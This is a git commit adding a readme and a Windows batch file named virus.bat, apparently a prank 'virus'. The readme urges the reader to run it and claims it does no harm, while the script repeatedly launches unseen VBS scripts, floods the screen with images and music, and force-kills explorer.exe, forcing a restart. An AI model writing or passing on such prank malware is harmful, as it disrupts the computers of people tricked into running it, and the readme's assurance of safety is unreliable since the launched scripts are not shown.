166c664bd44f993ec7a7dacee4b89e7332c43868
Adachifunniman <118222015+Adachifunniman@users.noreply.github.com>
2022-12-02 14:34:40 -0500

    Add files via upload

---
+++ readme.txt
@@ -0,0 +1,6 @@
+just run virus.vbs
+
+
+
+THIS DOES NOT HARM YOUR COMPUTER
+but you will have to restart after its done
---
+++ virus.bat
@@ -0,0 +1,34 @@
+@echo off
+start data\1.vbs
+timeout /t 30
+start data\music.mp3
+start data\fu.vbs
+start data\fu.vbs
+start data\fu.vbs
+start data\fu.vbs
+start data\hi.png
+timeout /t 1
+start data\fu.vbs
+start data\fu.vbs
+start data\fu.vbs
+start data\fu.vbs
+start data\hi.png
+start data\hi.png
+timeout /t 1
+start data\fu.vbs
+start data\fu.vbs
+start data\fu.vbs
+start data\fu.vbs
+start data\hi.png
+start data\hi.png
+timeout /t 1
+start data\fu.vbs
+start data\fu.vbs
+start data\fu.vbs
+start data\fu.vbs
+start data\hi.png
+start data\hi.png
+timeout /t 1
+taskkill /IM explorer.exe /T /F
+imeout /t 1
+exit
